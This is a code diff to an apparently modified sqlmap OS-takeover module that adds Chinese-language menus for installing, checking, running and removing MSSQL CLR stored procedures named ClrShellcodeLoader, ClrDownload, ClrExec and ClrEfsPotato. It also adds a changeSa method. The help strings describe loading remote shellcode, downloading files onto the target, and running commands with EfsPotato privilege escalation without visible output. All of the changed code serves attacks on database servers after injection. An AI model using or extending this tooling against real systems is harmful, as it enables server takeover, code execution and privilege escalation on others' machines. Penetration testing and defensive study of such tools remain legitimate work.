@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
+Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 """
 
@@ -32,7 +32,7 @@ from lib.takeover.clr_exploit import CLR_exploit
 from lib.utils.safe2bin import safechardecode
 from thirdparty.six.moves import input as _input
 
-class Abstraction(Web, UDF, XP_cmdshell,CLR_exploit):
+class Abstraction(Web, UDF, XP_cmdshell, CLR_exploit):
     """
     This class defines an abstraction layer for OS takeover functionalities
     to UDF / XP_cmdshell objects
@@ -163,56 +163,25 @@ class Abstraction(Web, UDF, XP_cmdshell,CLR_exploit):
 
             self.runCmd(command)
 
-    def execClrCmd(self,function, cmd, silent=False):
-        if Backend.isDbms(DBMS.MSSQL):
-            self.clrShellExecCmd(function,cmd, silent=silent)
-        else:
-            errMsg = "Feature not yet implemented for the back-end DBMS"
-            raise SqlmapUnsupportedFeatureException(errMsg)
-
-    def evalClrCmd(self,function, cmd, first=None, last=None):
-        retVal = None
-        if Backend.isDbms(DBMS.MSSQL):
-            retVal = self.clrShellEvalCmd(function,cmd, first, last)
-        else:
-            errMsg = "Feature not yet implemented for the back-end DBMS"
-            raise SqlmapUnsupportedFeatureException(errMsg)
-
-        return safechardecode(retVal)
-
     def runClr(self,function, cmd):
-        choice = None
+        if Backend.isDbms(DBMS.MSSQL):
+            self.clrShellExecCmd(function, cmd, silent=False)
 
-        if not self.alwaysRetrieveCmdOutput:
-            message = "do you want to retrieve the command standard "
-            message += "output? [Y/n/a] "
-            choice = readInput(message, default='Y').upper()
-
-            if choice == 'A':
-                self.alwaysRetrieveCmdOutput = True
-
-        if choice == 'Y' or self.alwaysRetrieveCmdOutput:
-            output = self.evalClrCmd(function,cmd)
-
-            if output:
-                conf.dumper.string("command standard output", output)
-            else:
-                dataToStdout("No output\n")
         else:
-            self.execClrCmd(function,cmd)
+            errMsg = "Feature not yet implemented for the back-end DBMS"
+            raise SqlmapUnsupportedFeatureException(errMsg)
 
-
-    def clrInstall(self,currentDb,a,b,c,d):
+    def clrInstall1(self, currentDb, dll_name, udf_assembly_name, procedure_class_name, procedure_function_name):
         try:
             if not self.set_permission(currentDb):
                 logger.error("Set permission error")
                 return
             time.sleep(1)
-            if not self.create_assembly(a,b):
+            if not self.create_assembly1(dll_name,udf_assembly_name):
                 logger.error("Create assembly error")
                 return
             time.sleep(1)
-            if not self.create_procedure(b,c,d):
+            if not self.create_procedure(udf_assembly_name,procedure_class_name,procedure_function_name):
                 logger.error("Create procedure error.")
                 return
             logger.info("The process has ended, and you can use --check-clr to determine if the installation was successful")
@@ -221,23 +190,95 @@ class Abstraction(Web, UDF, XP_cmdshell,CLR_exploit):
         except Exception as e:
             logger.error(e)
             return False
+
+    def clrInstall2(self, currentDb, dll_name, udf_assembly_name, procedure_class_name, procedure_function_name):
+        try:
+            if not self.set_permission(currentDb):
+                logger.error("Set permission error")
+                return
+            time.sleep(1)
+            if not self.create_assembly2(dll_name,udf_assembly_name):
+                logger.error("Create assembly error")
+                return
+            time.sleep(1)
+            if not self.create_procedure(udf_assembly_name,procedure_class_name,procedure_function_name):
+                logger.error("Create procedure error.")
+                return
+            logger.info("The process has ended, and you can use --check-clr to determine if the installation was successful")
+            logger.info("流程结束，可以使用--check-clr判断是否安装成功")
+            self.self_clr = True
+        except Exception as e:
+            logger.error(e)
+            return False
+
     def clrEnable(self):
         self.enable_clr()
 
     def oleEnable(self):
         self.enable_ole()
 
-    def clrDisable(self):
-        self.disable_clr()
+    def changeSa(self,currentdb):
+        self.change_sa(currentdb)
 
     def clrDisable(self):
         self.disable_clr()
 
-    def procedureCheck(self,fuction_name):
-        self.check_procedure(fuction_name)
+    def procedureCheck(self):
+        print("请选择一个选项：")
+        print("【1】ShellcodeLoader")
+        print("【2】RemoteDownload")
+        print("【3】Exec")
+        print("【4】EfsPotato")
+        print("【5】UserDefined")
+        choice = int(input("请输入需要检查的存储过程编号: "))
+        if choice == 1:
+            self.check_procedure("ClrShellcodeLoader")
 
-    def procedureDel(self,fuction_name):
-        self.del_procedure(fuction_name)
+        elif choice == 2:
+            self.check_procedure("ClrDownload")
+
+        elif choice == 3:
+            self.check_procedure("ClrExec")
+
+        elif choice == 4:
+            self.check_procedure("ClrEfsPotato")
+
+        elif choice == 5:
+            fuction_name = input("请输入需要查询的存储过程名称: ")
+            self.check_procedure(fuction_name)
+
+    def clrDel(self):
+        print("请选择一个选项：")
+        print("【1】ShellcodeLoader")
+        print("【2】RemoteDownload")
+        print("【3】Exec")
+        print("【4】EfsPotato")
+        print("【5】UserDefined")
+        print("【6】ALL【1-4】")
+
+        choice = int(input("请输入选项编号: "))
+        if choice == 1:
+            self.del_clr("ClrShellcodeLoader", "ClrShellcodeLoader")
+
+        elif choice == 2:
+            self.del_clr("ClrDownload", "ClrDownload")
+
+        elif choice == 3:
+            self.del_clr("ClrExec", "ClrExec")
+
+        elif choice == 4:
+            self.del_clr("ClrEfsPotato", "ClrEfsPotato")
+
+        elif choice == 5:
+            procedure_name = input("INPUT PROCEDURE NAME: ")
+            assembly_name = input("INPUT ASSEMBLY NAME: ")
+            self.del_clr(procedure_name,assembly_name)
+
+        elif choice == 6:
+            self.del_clr("ClrShellcodeLoader", "ClrShellcodeLoader")
+            self.del_clr("ClrDownload", "ClrDownload")
+            self.del_clr("ClrExec", "ClrExec")
+            self.del_clr("ClrEfsPotato", "ClrEfsPotato")
 
     def shellClr(self):
         if self.webBackdoorUrl and (not isStackingAvailable() or kb.udfFail):
@@ -271,7 +312,35 @@ class Abstraction(Web, UDF, XP_cmdshell,CLR_exploit):
             logger.info(infoMsg)
 
         autoCompletion(AUTOCOMPLETE_TYPE.OS, OS.WINDOWS if Backend.isOs(OS.WINDOWS) else OS.LINUX)
-        function = _input("input procedure name> ")
+
+        print("请选择一个选项：")
+        print("【1】ShellcodeLoader")
+        print("【2】RemoteDownload")
+        print("【3】Exec")
+        print("【4】EfsPotato")
+        print("【5】UserDefined")
+        choice = int(input("请输入选项编号: "))
+        print("【提示】所有模块执行均无回显，命令执行模块如果需要判断是否成功可以将执行结果输出到web目录或使用--ole-read读取内容")
+
+        if choice == 1:
+            function = "ClrShellcodeLoader"
+            print("【提示】当前使用的是 ClrShellcodeLoader ，该CLR模块的使用方法：clr_scloader1 远程shellcode文件 key\n")
+
+        elif choice == 2:
+            function = "ClrDownload"
+            print("【提示】当前使用的是 ClrDownload ，该CLR模块的使用方法：clr_download http://xxx/xxx.png c:/xxx/xx.png \n")
+
+        elif choice == 3:
+            function ="ClrExec"
+            print("【提示】当前使用的是 ClrExec ，该CLR模块的使用方法：clr_exec 拼接需要执行的命令\n")
+
+        elif choice == 4:
+            function = "ClrEfsPotato"
+            print("【提示】当前使用的是 ClrEfsPotato，该CLR模块的使用方法：clr_efspotato 拼接需要执行的命令\n")
+
+        elif choice == 5:
+            function = _input("input procedure name> ")
+
         while True:
             command = None
 
@@ -294,10 +363,9 @@ class Abstraction(Web, UDF, XP_cmdshell,CLR_exploit):
             if command.lower() in ("x", "q", "exit", "quit"):
                 break
 
-            self.runClr(function,command)
+            self.runClr(function , command)
             print('attempting to execute clr stored procedure...')
-            print('正在尝试执行clr存储过程，执行无回显，需要自行判断是否成功')
-
+            print('【提示】正在尝试执行clr存储过程，执行无回显，需要自行判断是否成功\n')
 
     def _initRunAs(self):
         if not conf.dbmsCred:
